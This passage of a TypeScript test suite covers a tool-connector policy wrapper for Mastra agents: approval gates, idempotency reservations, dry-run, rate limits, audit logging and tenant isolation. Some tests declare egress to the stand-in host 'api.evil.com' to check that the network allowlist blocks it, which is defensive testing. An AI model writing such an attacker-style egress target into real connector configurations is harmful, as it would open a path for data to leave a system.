      expect.objectContaining({
        decision: 'error',
        detail: expect.objectContaining({ stage: 'rate-limit-store' }),
      }),
    ]);
  });

  it('denies via approval before reserving', async () => {
    // #given
    const store = spyAtomicStore();
    const { tool } = makeConnector({
      permissions: { sideEffect: 'destructive', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    // #when
    await expect(
      run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).rejects.toThrow(ConnectorPolicyError);
    // #then — no reservation was burned on a denied call
    expect(store.reserve).not.toHaveBeenCalled();
  });

  it('fails closed when reserve() crashes', async () => {
    // #given
    const audit = new AuditLogger();
    const store: AtomicIdempotencyStore = {
      get: () => undefined,
      put: () => {},
      reserve: () => {
        throw new Error(PRIVATE_BACKEND_SENTINEL);
      },
      release: () => {},
    };
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    // #when / #then
    await expect(
      run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).rejects.toThrow(PRIVATE_BACKEND_SENTINEL);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'idempotency store reserve failed',
        detail: { stage: 'idempotency-store' },
      },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_BACKEND_SENTINEL,
    );
  });

  it('audits a dedicated event when the reservation came from a stale-pending takeover', async () => {
    // #given — a store reporting a takeover (audit D2)
    const audit = new AuditLogger();
    const store: AtomicIdempotencyStore = {
      get: () => undefined,
      put: () => {},
      reserve: () => ({ state: 'reserved', token: 'tok', tookOver: true }),
      release: () => {},
    };
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });

    // #when
    await run(tool, input, makeContext({ idempotencyKey: 'k1' }));

    // #then — a dedicated takeover record naming the connector and key,
    // alongside (not instead of) the call's own outcome record
    expect(execute).toHaveBeenCalledTimes(1);
    expect(audit.events()).toMatchObject([
      {
        resource: 'salesforce.createContact',
        decision: 'allowed',
        detail: { idempotencyKey: 'k1', tookOver: true },
      },
      { decision: 'allowed', detail: { idempotencyKey: 'k1' } },
    ]);
  });

  // A store whose reserve() outcome is settled manually by the test — models
  // an async store (D1) where the claimed row is visible to other callers
  // before the claimer's own promise resumes.
  function deferredReserveStore() {
    let settleReserve!: {
      resolve: (reservation: IdempotencyReservation) => void;
      reject: (error: unknown) => void;
    };
    const store = {
      get: vi.fn(() => undefined),
      put: vi.fn(),
      reserve: vi.fn(
        () =>
          new Promise<IdempotencyReservation>((resolve, reject) => {
            settleReserve = { resolve, reject };
          }),
      ),
      release: vi.fn(),
    } satisfies AtomicIdempotencyStore;
    return { store, settleReserve: () => settleReserve };
  }

  it('joins a same-isolate twin arriving during the reserve round-trip', async () => {
    // #given — reserve() parked unresolved, so a second call lands while
    // the first is mid-round-trip
    const { store, settleReserve } = deferredReserveStore();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when — both calls reach the keyed path before reserve resolves
    const calls = Promise.all([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    // #then — the twin joined the leader's placeholder instead of probing
    // the store (where it would have read 'pending' and been denied)
    expect(store.reserve).toHaveBeenCalledTimes(1);
    settleReserve().resolve({ state: 'reserved', token: 'tok' });
    expect(await calls).toEqual([{ ok: true }, { ok: true }]);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('shares a cross-isolate pending denial with a joined twin', async () => {
    // #given
    const audit = new AuditLogger();
    const { store, settleReserve } = deferredReserveStore();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when — another ISOLATE holds the key; the joined twin adopts the
    // leader's denial
    const calls = Promise.allSettled([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    settleReserve().resolve({ state: 'pending' });
    const outcomes = await calls;
    // #then — both reject with the idempotency denial, audited exactly once
    // (the joiner rethrows the leader's already-audited ConnectorPolicyError)
    for (const outcome of outcomes) {
      expect(outcome.status).toBe('rejected');
      const error = (outcome as PromiseRejectedResult).reason as unknown;
      expect(error).toBeInstanceOf(ConnectorPolicyError);
      expect((error as ConnectorPolicyError).policy).toBe('idempotency');
    }
    expect(store.reserve).toHaveBeenCalledTimes(1);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'denied', detail: { policy: 'idempotency' } },
    ]);
  });

  it('audits a reserve crash once when a twin has joined', async () => {
    // #given
    const audit = new AuditLogger();
    const { store, settleReserve } = deferredReserveStore();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when — the store round-trip crashes under both callers
    const calls = Promise.allSettled([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    settleReserve().reject(new Error('d1 reserve down'));
    const outcomes = await calls;
    // #then — both fail closed; ONE idempotency-store record, no duplicate
    // 'execute threw' from the joiner (the error is marked audited)
    for (const outcome of outcomes) {
      expect(outcome.status).toBe('rejected');
      expect((outcome as PromiseRejectedResult).reason).toMatchObject({
        message: 'd1 reserve down',
      });
    }
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'error', detail: { stage: 'idempotency-store' } },
    ]);
  });

  it('releases once and audits each caller when a joined attempt fails', async () => {
    // #given — a real atomic store; execute fails only after both callers
    // are attached to the shared attempt
    const store = spyAtomicStore();
    const audit = new AuditLogger();
    let failExecute!: (error: Error) => void;
    const execute = vi.fn(
      () =>
        new Promise<{ ok: boolean }>((_resolve, reject) => {
          failExecute = reject;
        }),
    );
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when
    const calls = Promise.allSettled([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    failExecute(new Error('salesforce 500'));
    const outcomes = await calls;
    // #then — both callers reject; the reservation is released exactly
    // once; each caller records its own execute failure (audit-once covers
    // store errors and denials, not shared execute outcomes)
    for (const outcome of outcomes) {
      expect(outcome.status).toBe('rejected');
    }
    expect(execute).toHaveBeenCalledTimes(1);
    expect(store.release).toHaveBeenCalledTimes(1);
    expect(store.put).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'error', detail: { stage: 'execute', idempotencyKey: 'k1' } },
      {
        decision: 'error',
        detail: { stage: 'execute', replayed: true, idempotencyKey: 'k1' },
      },
    ]);
  });
});

describe('dry-run', () => {
  function makeDryRunnable(overrides: Record<string, unknown> = {}) {
    const execute = vi.fn(async () => ({ ok: true, simulated: false }));
    const dryRunExecute = vi.fn(async () => ({ ok: true, simulated: true }));
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      dryRunExecute,
      permissions: { sideEffect: 'destructive', dryRun: true },
      ...overrides,
    });
    return { tool, execute, dryRunExecute };
  }

  it('simulates without approval, without executing, and audits { dryRun: true }', async () => {
    // #given — a destructive connector that would need a grant for real
    const audit = new AuditLogger();
    const { tool, execute, dryRunExecute } = makeDryRunnable({
      policies: { audit },
    });
    // #when — no grant, dry-run requested
    const result = await run(tool, input, makeContext({ dryRun: true }));
    // #then
    expect(result).toEqual({ ok: true, simulated: true });
    expect(execute).not.toHaveBeenCalled();
    expect(dryRunExecute).toHaveBeenCalledTimes(1);
    expect(audit.events()).toMatchObject([
      { decision: 'allowed', detail: { dryRun: true } },
    ]);
  });

  it('exempts dry-run requests from the compiled native approval pause', () => {
    // #given — Mastra resolves requireApproval BEFORE execute, so the
    // wrapper's dry-run branch alone cannot stop an agent run from
    // suspending; the compiled predicate must decline the pause itself
    const { tool } = makeDryRunnable();
    const predicate = tool.requireApproval as (
      inputData: unknown,
      ctx?: { requestContext?: Record<string, unknown> },
    ) => boolean;
    // #when / #then — dry-run skips the pause; real calls (and ctx-less
    // evaluations on Mastra's network/durable paths) still pause
    expect(
      predicate(input, { requestContext: { [DRY_RUN_CONTEXT_KEY]: true } }),
    ).toBe(false);
    expect(predicate(input, { requestContext: {} })).toBe(true);
    expect(predicate(input)).toBe(true);
    expect(predicate(input, {})).toBe(true);
  });

  it('denies a dry-run request on a connector without dry-run support', async () => {
    // #given — the caller asked for a simulation; executing for real would
    // violate that intent, so the unsupported manifest fails closed
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'read' },
      policies: { audit },
    });
    // #when
    const failure = await run(tool, input, makeContext({ dryRun: true })).catch(
      (error: unknown) => error,
    );
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('dry-run');
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'denied', detail: { policy: 'dry-run' } },
    ]);
  });

  it('still applies pre-execute gates to simulations', async () => {
    // #given — an egress-blocked connector; a simulation must not slip past
    // the isolation/egress pre-checks
    const { tool, dryRunExecute } = makeDryRunnable({
      permissions: {
        sideEffect: 'destructive',
        dryRun: true,
        egress: ['api.evil.com'],
      },
      policies: { networkEgress: { allowedDomains: ['api.salesforce.com'] } },
    });
    // #when
    const failure = await run(tool, input, makeContext({ dryRun: true })).catch(
      (error: unknown) => error,
    );
    // #then
    expect((failure as ConnectorPolicyError).policy).toBe('network-egress');
    expect(dryRunExecute).not.toHaveBeenCalled();
  });

  it('skips the idempotency machinery entirely', async () => {
    // #given — a keyed connector; a simulation must not read from or write
    // to the replay store
    const get = vi.fn(() => undefined);
    const put = vi.fn();
    const { tool, dryRunExecute } = makeDryRunnable({
      permissions: {
        sideEffect: 'write',
        dryRun: true,
        idempotencyKey: true,
      },
      policies: { idempotencyStore: { get, put } },
    });
    // #when — dry-run without even supplying a key
    const result = await run(tool, input, makeContext({ dryRun: true }));
    // #then
    expect(result).toEqual({ ok: true, simulated: true });
    expect(dryRunExecute).toHaveBeenCalledTimes(1);
    expect(get).not.toHaveBeenCalled();
    expect(put).not.toHaveBeenCalled();
  });

  it('records a simulation crash with { dryRun: true } and rethrows', async () => {
    // #given
    const audit = new AuditLogger();
    const dryRunExecute = vi.fn(async () => {
      throw new Error('simulation backend down');
    });
    const { tool } = makeDryRunnable({ dryRunExecute, policies: { audit } });
    // #when / #then
    await expect(
      run(tool, input, makeContext({ dryRun: true })),
    ).rejects.toThrow('simulation backend down');
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        detail: { stage: 'execute', dryRun: true },
      },
    ]);
  });

  it('requires dryRunExecute when the manifest declares dryRun', () => {
    // #when / #then
    expect(() =>
      makeConnector({
        permissions: { sideEffect: 'write', dryRun: true },
      }),
    ).toThrow(TypeError);
  });

  it('rejects dryRunExecute without the manifest declaration', () => {
    // #when / #then
    expect(() =>
      makeConnector({
        dryRunExecute: async () => ({ ok: true }),
        permissions: { sideEffect: 'write' },
      } as Partial<Parameters<typeof createConnector>[0]>),
    ).toThrow(TypeError);
  });
});

describe('rate limit', () => {
  it('requires a bound store at definition time', () => {
    // #when / #then
    expect(() =>
      makeConnector({
        permissions: { sideEffect: 'write', rateLimit: '2/min' },
      }),
    ).toThrow(TypeError);
  });

  it.each([
    'nope',
    '0/min',
    '2/mins',
    '2 / min',
    '2/minutes',
    '/min',
    '2/',
  ])("rejects malformed rate limit '%s' at definition time", (rateLimit) => {
    // #when / #then
    expect(() =>
      makeConnector({
        permissions: { sideEffect: 'write', rateLimit },
        policies: { rateLimitStore: new InMemoryRateLimitStore() },
      }),
    ).toThrow(TypeError);
  });

  it.each([
    '9007199254740992/min',
    `${'9'.repeat(400)}/min`,
  ])("rejects storage-unsafe rate-limit count '%s'", (rateLimit) => {
    expect(() =>
      makeConnector({
        permissions: { sideEffect: 'write', rateLimit },
        policies: { rateLimitStore: new InMemoryRateLimitStore() },
      }),
    ).toThrow(/safe-integer count from 1 through 9007199254740991/);
  });

  it.each([
    '1/min',
    '9007199254740991/min',
  ])("accepts supported rate-limit boundary '%s'", (rateLimit) => {
    expect(() =>
      makeConnector({
        permissions: { sideEffect: 'write', rateLimit },
        policies: { rateLimitStore: new InMemoryRateLimitStore() },
      }),
    ).not.toThrow();
  });

  it('allows the budget then denies the call over it', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', rateLimit: '2/min' },
      policies: { rateLimitStore: new InMemoryRateLimitStore(), audit },
    });
    // #when — two executions consume the budget...
    await run(tool, input);
    await run(tool, input);
    // ...the third denies
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('rate-limit');
    expect((failure as ConnectorPolicyError).reason).toBe('exceeded 2/min');
    expect(execute).toHaveBeenCalledTimes(2);
    expect(audit.events()).toMatchObject([
      { decision: 'allowed' },
      { decision: 'allowed' },
      { decision: 'denied', detail: { policy: 'rate-limit' } },
    ]);
  });

  it('resets the budget on window rollover', async () => {
    // #given
    vi.useFakeTimers();
    try {
      vi.setSystemTime(new Date('2026-07-07T10:00:30Z'));
      const { tool, execute } = makeConnector({
        permissions: { sideEffect: 'write', rateLimit: '1/min' },
        policies: { rateLimitStore: new InMemoryRateLimitStore() },
      });
      // #when — budget spent in this window...
      await run(tool, input);
      await expect(run(tool, input)).rejects.toThrow(ConnectorPolicyError);
      // ...the next fixed window starts fresh
      vi.setSystemTime(new Date('2026-07-07T10:01:05Z'));
      await run(tool, input);
      // #then
      expect(execute).toHaveBeenCalledTimes(2);
    } finally {
      vi.useRealTimers();
    }
  });

  it('does not consume budget on an idempotent replay', async () => {
    // #given — budget 1; the same key runs then replays twice
    const { tool, execute } = makeConnector({
      permissions: {
        sideEffect: 'write',
        rateLimit: '1/min',
        idempotencyKey: true,
      },
      policies: {
        rateLimitStore: new InMemoryRateLimitStore(),
        idempotencyStore: new InMemoryIdempotencyStore(),
      },
    });
    // #when
    await run(tool, input, makeContext({ idempotencyKey: 'k1' }));
    const replayed = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    );
    // #then — replays served from the store, budget untouched
    expect(replayed).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('does not consume budget on a denied call', async () => {
    // #given — approval denies before the rate gate; budget 1
    const store = new InMemoryRateLimitStore();
    const { tool } = makeConnector({
      permissions: {
        sideEffect: 'destructive',
        rateLimit: '1/min',
      },
      policies: { rateLimitStore: store },
    });
    // #when — a denied (ungranted) call, then a granted one
    await expect(run(tool, input)).rejects.toThrow(ConnectorPolicyError);
    // #then — the denial consumed nothing; the granted call executes
    expect(
      await run(
        tool,
        input,
        makeContext({ approved: ['salesforce.createContact'] }),
      ),
    ).toEqual({ ok: true });
  });

  it('fails closed and audits when the rate-limit store crashes', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', rateLimit: '5/min' },
      policies: {
        rateLimitStore: {
          increment: () => {
            throw new Error(PRIVATE_BACKEND_SENTINEL);
          },
        },
        audit,
      },
    });
    // #when / #then
    await expect(run(tool, input)).rejects.toThrow(PRIVATE_BACKEND_SENTINEL);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'rate-limit store increment failed',
        detail: { stage: 'rate-limit-store' },
      },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_BACKEND_SENTINEL,
    );
  });
});

describe('InMemoryIdempotencyStore', () => {
  it('evicts the least recently written key past maxEntries', () => {
    // #given
    const store = new InMemoryIdempotencyStore({ maxEntries: 2 });
    // #when
    store.put('k1', { result: 1 });
    store.put('k2', { result: 2 });
    store.put('k1', { result: 1 }); // refresh: k2 is now oldest
    store.put('k3', { result: 3 });
    // #then
    expect(store.get('k2')).toBeUndefined();
    expect(store.get('k1')).toEqual({ result: 1 });
    expect(store.get('k3')).toEqual({ result: 3 });
  });

  it('reserves once, reports the holder as pending, and replays after put', () => {
    // #given
    const store = new InMemoryIdempotencyStore();
    // #when / #then
    expect(store.reserve('k1')).toEqual({
      state: 'reserved',
      token: expect.any(String),
    });
    expect(store.reserve('k1')).toEqual({ state: 'pending' });
    store.put('k1', { result: 1 });
    expect(store.reserve('k1')).toEqual({
      state: 'replay',
      record: { result: 1 },
    });
    // a stray release after completion never deletes the done record
    store.release('k1');
    expect(store.get('k1')).toEqual({ result: 1 });
  });

  it('release() makes a failed key reservable again', () => {
    // #given
    const store = new InMemoryIdempotencyStore();
    expect(store.reserve('k1')).toEqual({
      state: 'reserved',
      token: expect.any(String),
    });
    // #when
    store.release('k1');
    // #then
    expect(store.reserve('k1')).toEqual({
      state: 'reserved',
      token: expect.any(String),
    });
  });

  it('binds release/put to the reservation token — a stale token cannot delete or finalize a live reservation (audit D2)', () => {
    // #given — a live reservation holding its lease token
    const store = new InMemoryIdempotencyStore();
    const reservation = store.reserve('k1');
    if (reservation.state !== 'reserved') {
      throw new Error('expected a reservation');
    }

    // #when / #then — a stale/foreign token neither releases nor finalizes...
    store.release('k1', 'stale-token');
    expect(store.reserve('k1')).toEqual({ state: 'pending' });
    store.put('k1', { result: 'stale' }, 'stale-token');
    expect(store.reserve('k1')).toEqual({ state: 'pending' });

    // ...but the owner's own lease finalizes, and the key then replays
    store.put('k1', { result: 'owner' }, reservation.token);
    expect(store.reserve('k1')).toEqual({
      state: 'replay',
      record: { result: 'owner' },
    });
  });
});

describe('Mastra integration edges', () => {
  it('enforces gates when invoked without an execution context', async () => {
    // #given — Mastra's Tool wrapper backfills an empty requestContext when
    // no context argument is passed, so every gate must still fire
    const destructive = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const idempotent = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });
    const egressBlocked = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.evil.com'] },
      policies: { networkEgress: { allowedDomains: ['api.salesforce.com'] } },
    });
    // #when / #then
    await expect(bareRun(destructive.tool, input)).rejects.toThrow(
      ConnectorPolicyError,
    );
    await expect(bareRun(idempotent.tool, input)).rejects.toThrow(
      ConnectorPolicyError,
    );
    await expect(bareRun(egressBlocked.tool, input)).rejects.toThrow(
      ConnectorPolicyError,
    );
  });

  it('returns a validation error without running gates on invalid input', async () => {
    // #given — Mastra's Tool wrapper validates against inputSchema before
    // gatedExecute and returns a ValidationError VALUE (not a throw)
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.evil.com'] },
      policies: {
        networkEgress: { allowedDomains: ['api.salesforce.com'] },
        audit,
      },
    });
    // #when
    const result = await run(tool, { email: 42 });
    // #then
    expect(result).toMatchObject({ error: true });
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toEqual([]);
  });

  it('does not compound schema transformations across wrapper and Mastra', async () => {
    // #given — Breakwater validates and transforms before idempotency commit,
    // then Mastra consumes the captured Standard Schema result
    const execute = vi.fn(async () => 'raw');
    const tool = createConnector({
      id: 'report.read',
      description: 'Read a report',
      outputSchema: z.string().transform((value) => `${value}!`),
      execute,
      permissions: { sideEffect: 'read' },
    });

    // #when / #then — the wrapper checks the raw value but does not feed the
    // transformed value back through Mastra for a second transformation
    expect(await run(tool, {})).toBe('raw!');
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('preserves direct validation through the public output-schema surface', async () => {
    // #given — composition and inspection code may validate through the
    // public Tool.outputSchema without invoking the connector
    const outputSchema = z.string().transform((value) => `${value}!`);
    const tool = createConnector({
      id: 'report.read',
      description: 'Read a report',
      outputSchema,
      execute: async () => 'raw',
      permissions: { sideEffect: 'read' },
    });

    // #when / #then — ordinary values still delegate to the host schema;
    // the private carrier optimization applies only to wrapper execution
    const validation = await tool.outputSchema?.['~standard'].validate('raw');
    expect(validation).toEqual({ value: 'raw!' });
  });
});

describe('audit attribution', () => {
  it('attributes decisions to the requestContext actor', async () => {
    // #given
    const audit = new AuditLogger();
    const actor: Actor = { id: 'user-7', role: 'operator' };
    const { tool } = makeConnector({ policies: { audit } });
    // #when
    await run(tool, input, makeContext({ actor }));
    // #then
    expect(audit.events()).toMatchObject([
      {
        action: 'connector.execute',
        resource: 'salesforce.createContact',
        decision: 'allowed',
        actor: { id: 'user-7', role: 'operator' },
        detail: { sideEffect: 'write' },
      },
    ]);
  });

  it('records execute crashes as errors and rethrows', async () => {
    // #given
    const audit = new AuditLogger();
    const sentinel = 'private-prompt-and-stderr-sentinel';
    const execute = vi.fn(async () => {
      throw new Error(sentinel);
    });
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write' },
      policies: { audit },
    });
    // #when / #then
    await expect(run(tool, input)).rejects.toThrow(sentinel);
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'connector execution failed',
        detail: { stage: 'execute' },
      },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(sentinel);
  });

  it('correlates allowed, denied, replay, store-error, and execution-error records from trusted context', async () => {
    const audit = new AuditLogger();
    const auditContext = {
      agentId: 'agent-trusted',
      tenantId: 'tenant-trusted',
      runId: 'run-trusted',
      threadId: 'thread-trusted',
      resourceId: 'resource-trusted',
      entryPath: 'http-start',
      principalKind: 'service',
      principalId: 'principal-trusted',
    };
    const correlated = (idempotencyKey?: string) =>
      makeContext({ auditContext, idempotencyKey });

    await run(makeConnector({ policies: { audit } }).tool, input, correlated());

    const denied = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: new InMemoryIdempotencyStore() },
    }).tool;
    await run(denied, input, correlated()).catch(() => {});

    const replay = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: new InMemoryIdempotencyStore() },
    }).tool;
    await run(replay, input, correlated('replay-key'));
    await run(replay, input, correlated('replay-key'));

    const storeError = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: {
        audit,
        idempotencyStore: {
          get: () => {
            throw new Error('private store failure');
          },
          put: () => {},
        },
      },
    }).tool;
    await run(storeError, input, correlated('store-key')).catch(() => {});

    const spoofedExecutionError = registerSafeAuditError(
      new Error('private execution failure'),
      {
        reason: 'registered connector failure',
        detail: {
          tenantId: 'tenant-spoofed',
          runId: 'run-spoofed',
          resourceId: 'resource-spoofed',
          principalId: 'principal-spoofed',
        },
      },
    );
    const executionError = makeConnector({
      execute: async () => {
        throw spoofedExecutionError;
      },
      policies: { audit },
    }).tool;
    await run(executionError, input, correlated()).catch(() => {});

    expect(audit.events()).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ decision: 'allowed' }),
        expect.objectContaining({ decision: 'denied' }),
        expect.objectContaining({
          decision: 'allowed',
          detail: expect.objectContaining({ replayed: true }),
        }),
        expect.objectContaining({
          decision: 'error',
          detail: expect.objectContaining({ stage: 'idempotency-store' }),
        }),
        expect.objectContaining({
          decision: 'error',
          detail: expect.objectContaining({ stage: 'execute' }),
        }),
      ]),
    );
    for (const event of audit.events()) {
      expect(event.detail).toMatchObject(auditContext);
    }
    expect(audit.events().at(-1)).toMatchObject({
      decision: 'error',
      reason: 'registered connector failure',
      detail: {
        tenantId: 'tenant-trusted',
        runId: 'run-trusted',
        resourceId: 'resource-trusted',
        principalId: 'principal-trusted',
      },
    });
  });
});

describe('isolation scope (multi-tenant key segmentation)', () => {
  function scopedContext(options: {
    scope?: string;
    idempotencyKey?: string;
    dryRun?: boolean;
  }): ToolExecutionContext {
    const requestContext = new RequestContext();
    if (options.scope !== undefined) {
      requestContext.set(ISOLATION_SCOPE_CONTEXT_KEY, options.scope);
    }
    if (options.idempotencyKey !== undefined) {
      requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, options.idempotencyKey);
    }
    if (options.dryRun) requestContext.set(DRY_RUN_CONTEXT_KEY, true);
    return { requestContext } as unknown as ToolExecutionContext;
  }

  it('the SAME business key under two scopes does not replay across tenants', async () => {
    // #given — metamind's canonical cross-run key ("never email this lead
    // twice") is business identity two tenants can legitimately share; the
    // scope segment is what keeps B's send from replaying A's cached result
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });

    // #when — tenant A executes, tenant B presents the SAME key
    const a = await run(
      tool,
      input,
      scopedContext({ scope: 'acme', idempotencyKey: 'send:ada@example.com' }),
    );
    const b = await run(
      tool,
      input,
      scopedContext({ scope: 'bravo', idempotencyKey: 'send:ada@example.com' }),
    );

    // #then — both executed for real; same-scope replay still works
    expect(a).toEqual({ ok: true });
    expect(b).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(2);
    await run(
      tool,
      input,
      scopedContext({ scope: 'acme', idempotencyKey: 'send:ada@example.com' }),
    );
    expect(execute).toHaveBeenCalledTimes(2);
  });

  it("scope segments the rate-limit budget: A exhausting connector 'c' does not throttle B", async () => {
    // #given — a budget of 1/min shared-in-name across two tenants
    const { tool } = makeConnector({
      permissions: { sideEffect: 'write', rateLimit: '1/min' },
      policies: { rateLimitStore: new InMemoryRateLimitStore() },
    });

    // #when — A consumes its whole budget
    await run(tool, input, scopedContext({ scope: 'acme' }));
    const aSecond = run(tool, input, scopedContext({ scope: 'acme' }));

    // #then — A is throttled; B still executes
    await expect(aSecond).rejects.toMatchObject({
      name: 'ConnectorPolicyError',
      policy: 'rate-limit',
    });
    await expect(
      run(tool, input, scopedContext({ scope: 'bravo' })),
    ).resolves.toEqual({ ok: true });
  });

  it('absent scope preserves the single-tenant keys exactly (no flag to forget)', async () => {
    // #given — no scope anywhere: the OSS default
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });

    // #when — same key twice, no scope
    await run(tool, input, scopedContext({ idempotencyKey: 'k1' }));
    await run(tool, input, scopedContext({ idempotencyKey: 'k1' }));

    // #then — replayed, exactly as before the scope feature existed
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('a tenantIsolation-policied connector denies a scope-less call INCLUDING dry-run', async () => {
    // #given — the platform's policy set includes the evaluator; the dry-run
    // branch returns before idempotency/rate-limit, so only a gates-loop
    // evaluator can bind simulations
    const dryRunExecute = vi.fn(async () => ({ ok: true }));
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', dryRun: true },
      dryRunExecute,
      policies: { evaluators: [tenantIsolation()] },
    });

    // #when / #then — scope-less real call denies
    await expect(run(tool, input, scopedContext({}))).rejects.toMatchObject({
      name: 'ConnectorPolicyError',
      policy: 'tenant-isolation',
    });
    // scope-less DRY-RUN denies too — the simulation never runs
    await expect(
      run(tool, input, scopedContext({ dryRun: true })),
    ).rejects.toMatchObject({
      name: 'ConnectorPolicyError',
      policy: 'tenant-isolation',
    });
    expect(execute).not.toHaveBeenCalled();
    expect(dryRunExecute).not.toHaveBeenCalled();

    // and a scoped dry-run simulates normally
    await expect(
      run(tool, input, scopedContext({ scope: 'acme', dryRun: true })),
    ).resolves.toEqual({ ok: true });
    expect(dryRunExecute).toHaveBeenCalledTimes(1);
  });
});

describe('in-memory store under a minted isolation scope (D5)', () => {
  it('warns once per idempotency store instance when a scope is present', async () => {
    // #given
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const store = new InMemoryIdempotencyStore();
    const { tool } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const requestContext = new RequestContext();
    requestContext.set(ISOLATION_SCOPE_CONTEXT_KEY, 'tenant-a');
    requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, 'k1');
    const context = { requestContext } as unknown as ToolExecutionContext;

    // #when — two scoped calls through the SAME store instance
    await run(tool, input, context);
    requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, 'k2');
    await run(tool, input, context);

    // #then — exactly one warning for this store instance, not one per call
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toContain('InMemoryIdempotencyStore');
    warn.mockRestore();
  });

  it('does not warn for an idempotency store when no isolation scope is present', async () => {
    // #given
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const { tool } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });

    // #when
    await run(tool, input, makeContext({ idempotencyKey: 'k1' }));

    // #then
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });

  it('warns once per rate-limit store instance when a scope is present', async () => {
    // #given
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const rateLimitStore = new InMemoryRateLimitStore();
    const { tool } = makeConnector({
      permissions: { sideEffect: 'read', rateLimit: '5/min' },
      policies: { rateLimitStore },
    });
    const requestContext = new RequestContext();
    requestContext.set(ISOLATION_SCOPE_CONTEXT_KEY, 'tenant-a');
    const context = { requestContext } as unknown as ToolExecutionContext;

    // #when — two scoped calls through the SAME store instance
